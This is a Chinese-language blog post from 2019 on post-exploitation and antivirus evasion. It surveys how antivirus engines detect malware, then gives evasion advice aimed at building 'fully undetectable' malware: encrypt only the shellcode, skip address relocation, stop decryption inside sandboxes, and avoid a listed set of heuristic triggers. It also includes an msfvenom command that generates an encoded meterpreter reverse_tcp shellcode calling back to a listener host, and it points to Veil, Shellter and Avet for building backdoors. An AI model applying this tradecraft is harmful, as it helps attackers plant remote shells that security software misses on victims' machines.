---
layout:     post
title:      后渗透流程&&免杀
date:       2019-1-3
author:     Wh0ale
header-img: img/lean_by_wlop-d935vg4.jpg
catalog: true
tags:
    - bypass
---

对后渗透做一个总结，顺便写写最近学到的木马定位免杀。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyt9f1wapgj20qd0n7wgj.jpg)



# 0x01 杀毒软件原理

**杀毒软件在判断特征代码时，一般会解析文件格式，例如PE文件，大致过程可以认为检查这些关键项目**

```html
MZ -> PE - >CODE->DATA->IMPORT TABLE->EXPORT TABLE->RESOURCE...
```

我们可以这样假设报毒过程，**如果检测文件是PE**,如果在CODE位置存在 标志A,在DATA位置存在标志B,在资源位置存在标志C,同时满足这个3个条件，那么杀软就会报毒,VIRTEST工作原理就是要找到引起报毒最后一个标志，也就是假设中的标志C。

因此VIRTEST采用2分排除法，测试标志C所在文件中的位置，由于被杀的文件可能存在多个 类似于ABC这样的连锁条件，所以我们必须要通过一种排除机制，**先要找最靠近文件前部的连锁条件，排除掉文件尾部数据，当找到第一个连锁条件后，抹掉引标志C，再恢复尾部数据**

然后继续测试另外的连锁条件，直到找到最后一个连锁条件，抹掉后，整个文件免杀了，则说明特征代码被定为完毕了，所以VIRTEST绝对可以精确的定位出所有的复合特征。这比文件分块定位法先进得多，更为科学。

所以VIRTEST5.0必定是当前最先进，最好的特征代码定位器，免杀的必备武器。

VirTest5.0特征码定位器

>```html
>VirTest5.0采用二分排除法定位特征代码，对单一以及复合特征定位极其精确可靠。
>VirTest5.0可以自动验证定位结果。
>VirTest5.0可以直接观察特征码所在位置文件数据。
>VirTest5.0可以说是目前最好特征码定位器，可以将特征代码锁定在1-7字节范围内。
>```

## 1.检测机制 

每一类型的恶意软件所实施的反检测技术都是不一样的（恶意软件可以分为病毒、木马、僵尸程序、流氓软件、勒索软件、广告程序等），虽然本文会对所有相关的反检测技术都进行介绍，但我们还是会将注意力放在stager阶段的meterpreter这种有效载荷的工具上，因为几乎所有的恶意软件的攻击命令的执行都必须依靠 meterpreter来实施攻击，例如: 提权、凭证窃取、进程迁移、注册表操作和分配更多的后续攻击， 另外，MetasploitFramework是一个缓冲区溢出测试使用的辅助工具，也可以说是一个漏洞利用和测试平台，它集成了各种平台上常见的溢出漏洞和流行的shellcode，并且不断更新，使得缓冲区溢出测试变的方便和简单。

**1.基于签名的检测：**

传统的防病毒软件很大程度上依赖于签名来识别恶意软件。工作原理如下：

当恶意软件被杀软公司采集后，杀软后台的研究人员以及动态分析系统便会对这些样本进行分析，一旦确定是恶意软件，后台便会提取恶意文件的标签并将其添加到反病毒软件的签名数据库中。

**2. 静态程序分析：**

静态程序分析是在不实际运行程序的情况下进行的分析。

大部份的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。

**3. 动态程序分析：**

动态程序分析是通过在真实或虚拟处理器上执行程序而执行的分析。为了使动态程序分析真实可信，我们必须要能够对各种目标程序的行为进行测试。

**4.沙盒分析技术：**

沙盒是一个观察计算机病毒的重要环境，用于为一些来源不可信、具备破坏力或无法判定程序意图的程序提供试验环境。 

**5.启发式分析：**

启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新的病毒变体。

启发式分析是基于专家的分析，利用它可以对已知或未知的恶意软件进行各种维度的风险衡量，其中多标准分析（MCA）是其中的方法之一，不过启发式分析不是统计分析而是基于可用的数据或统计。

**6.信息熵检测：**

每个恶意软件都可以被描述成数值性质的属性(例如:信息熵)或者抽象性质的属性，信息熵就是通过找到最合适的量度来验证并且对比恶意软件的属性。

**7.其他常见检测技术**

7.1 混淆检测：

病毒由两个部分组成：载荷（payload）和混淆部件（obfuscator），载荷是用来做坏事的代码，而混淆部件则是病毒用来保护自身免于被查杀的，通常恶意软件开发者都会将其代码进行混淆以降低其代码的可读性

所以混淆检测就非常的有针对性。

7.2 加壳检测：

恶意软件一般都会被压缩加壳，因为加壳会将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组合成单个可执行文件的一种手段。 当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩数据中重新创建原始代码。所以检测恶意软件是否使用了加壳技术，也是发现的一种重要手段。

7.3 加密检测：

恶意软件使用加密对其二进制程序进行加密，以免被逆向分析。加密存在于恶意软件的构建器和存根中，当恶意软件需要解密时，不会用恶意代码常用的正常方法执行它。为了隐藏进程，恶意软件使用了一个有名的RunPE的技术，代码会以挂起的方式执行一个干净的进程（比如iexplorer.exe或者explorer.exe），然后把内存内容修改成恶意代码后再执行。所以检测RunPE的运行，就可以很容易的检测到恶意软件了。

## **2.加密与加壳检测技术的深度分析**

由于目前杀毒软件的检测技术也来越高，不仅能对恶意软件签名和攻击行为分析，还能够对使用的加密与加壳技术进行探测。由于对加密与加壳的检测相对容易，所以目前**杀软公司都侧重于对加密与加壳行为进行检测**，但凡出现这些可疑行为，例如，PE文件在内存进行加密和解密加载时，都会进行深入分析。

为了完全理解PE映像的内存执行过程，我们先要了解一下Windows是如何加载PE文件的。一**般在编译PE文件时，编译器会将主模块的地址设置为0x00400000，而编译过程中所有的地址指针和长跳转指令地址都是依据主模块的地址来计算，在编译过程结束时，编译器会在 PE 文件中创建一个重定位分区表，重定位PE文件所有的地址指针和长跳转指令地址。**

在执行PE映像时，Windows会检查PE文件要映射到的进程地址空间是否可用，如果空间不可用，则Windows会会在启动之前将PE映像加载到内存上的绝对地址，再利用重定位分区表修正所有地址。 所有这种机制称为 “地址空间布局随机化(ASLR) ”。

为了在内存密码器上执行PE映像，需要对PE文件头进行解析并重定位绝对地址，如果出现**模拟系统加载器**这种可疑的行为就证明该运行很可能是恶意运行。在我们对所有使用C 语言或更高级语言编写的加密程序进行分析时，总能看到“NtUnmapViewOfSection”和“ZwUnmapViewOfSection”这样的Windows API函数，这些函数会简单地从主体进程的虚拟地址空间中取消映射视图， 以上这个操作过程就是RunPE，几乎90%的加密都会使用到这一技术。

![免杀艺术 1: 史上最全的免杀方法汇总](http://www.4hou.com/uploads/20170315/1489538331169007.png)

当然杀软产品不能仅仅根据是否使用了Windows API 函数就判断该程序是恶意的，但是可以根据该函数的使用顺序来提高检测的准确率。

鉴于杀软产品已经开始对加密与加壳技术进行探测，目前已有一部分恶意软件的开发者在使用密码器进行汇编时，不使用这些Windows API 函数和手动执行重定位，因为他们知道，没有哪一个正常的程序会刻意的进行模仿系统的加载。

另外由于在不断加载的过程中，恶意软件会产生很多文件，而这些文件所自带的信息熵增加到一定程度时，就会被杀软产品标记为可疑行为进而进行持续的分析。

![免杀艺术 1: 史上最全的免杀方法汇总](http://www.4hou.com/uploads/20170315/1489538342609203.png)



## **3.完美的免杀方法**

到目前为止，要实现恶意软件的“FUD”，加密恶意代码被认为是个不错的选择，不过有几点要注意：

1.恶意程序在解密时，应当也进行代码混淆

2.当恶意文件在内存中运行解密代码时，我们必须要保证在不重定位绝对地址的情况下进行

3.恶意软件是否在沙箱环境中运行，如果是，则立马停止恶意文件的解密

4.应当只对 PE 文件中的 shellcode 或 只有二进制文件的.text部分进行加密，而不是对整个 PE 文件进行，以便把信息熵和降到最低

以下是恶意软件流程图。

![免杀艺术 1: 史上最全的免杀方法汇总](http://www.4hou.com/uploads/20170315/1489538358281891.png)



## **4.启发式引擎**

启发式引擎是基于统计和规则的分析机制。他们主要的目的是检测事先未知的病毒，同时根据预定义的标准给出威胁等级，甚至当一个正常运行的程序超出其威胁等级时，也会被认定为恶意软件。

由于启发式引擎是杀软产品中最核心的部分，每个公司都会基于自己不同的判断规则和行为分析，因此没有正式的威胁等级标准让我们参考，所以我们只能自行总结出常见的一些判断标准，来供大家参考：

```
循环解密行为
读取运行设备名称
读取加密器的 GUID
连接随机域名
读取 Windows 安装日期
删除可执行文件
在二进制文件内存中搜索可用的IP地址
修改代理设置
在运行的进程中安装HOOKS或PATCHES
往浏览器中注入代码
注入远程进程
查询进程信息
设置过程错误模式以覆盖错误窗口
异常熵的出现
检测杀软的存在
对特定的注册表项的变动情况进行监控
包含提权的能力
修改软件的相关限制策略
读取系统/视频 BIOS 版本
PE文件头中的结束字节异常
创建受保护的内存区域
创建大量进程
企图进行长时间休眠
不常用的字节
读取 Windows产品ID
包含循环解密
包含启动或操作设备的驱动程序的能力
包含阻止用户进行干扰的能力
……
```

所以，当我们在编写免杀的恶意软件和解密shellcode模块时，一定要避免上面这些坑。

# 0x02 payload免杀

分离免杀主要分两大类，一类为第三方分离免杀，一类为自带安装分离免杀。文章中，采取了**第三方分离免杀**。

目前的反病毒安全软件，常见有三种，**一种基于特征，一种基于行为，一种基于云查杀**。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对PE头文件的查杀。尤其是当payload文件越大的时候，特征越容易查杀。

既然知道了目前的主流查杀方式，那么反制查杀，此篇采取**特征与行为分离免杀**。避免PE头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于windows下为了更稳定的一种常用手法。载入内存。

**1.第三方分离免杀**

payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：

```
msfvenom -pwindows/x64/meterpreter/reverse_tcp lhost=192.168.1.5 lport=8080 -ex86/shikata_ga_nai -i 5 -f raw > test.c
```

shellcode方式的payload，那么需要借助第三方来启动，加载到内存。

[https://github.com/clinicallyinane/shellcode_launcher/](https://github.com/clinicallyinane/shellcode_launcher/)

**2.自带安装分离免杀**

**①. veil**

Veil是一种可以生成带有Metasploit载荷的后门工具，可以绕过部分杀软的防御，软件本身一直在更新。

**②. Shellter**

Shellter采用了动态Shellcode注入来实现免杀的效果，当用户打开被植入后门的软件时，只有触发一定的操作才会启动后门。

**③. Avet**

git clone https://github.com/govolution/avet

安装完毕后，找到自己想要生成的后门载荷，切到/avet/build/目录下打开相应的.sh文件对LHOST和LPORT进行修改。



参考：

[http://www.4hou.com/technology/3853.html](http://www.4hou.com/technology/3853.html)

[https://www.secpulse.com/archives/94028.html](https://www.secpulse.com/archives/94028.html)